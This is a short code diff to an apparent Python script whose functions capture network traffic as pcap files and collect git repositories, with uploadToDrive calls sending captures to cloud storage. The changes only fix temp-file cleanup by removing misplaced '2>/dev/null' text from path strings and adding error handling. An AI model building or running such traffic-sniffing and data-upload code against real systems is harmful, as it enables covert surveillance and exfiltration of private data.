@@ -99,7 +99,7 @@ def sniff(toggle):
             uploadToDrive(dest_folder,mime_types['pcap']) 
             os.remove(dest_folder)
         try:
-            os.rmdir('/tmp/captures 2>/dev/null')
+            os.rmdir('/tmp/captures')
         except:
             pass
         
@@ -241,10 +241,13 @@ def get_git_repos():
             os.remove(dest_folder)
         except:
             continue
-    for file in os.listdir("/tmp/gitFiles"):
-        os.remove("/tmp/gitFiles/ 2>/dev/null"+file)
+    try:
+        for file in os.listdir("/tmp/gitFiles"):
+            os.remove("/tmp/gitFiles/"+file)
     
-    os.rmdir('/tmp/gitFiles 2>/dev/null')
+        os.rmdir('/tmp/gitFiles')
+    except:
+        pass
     os.chdir(cwd)
     return 
 
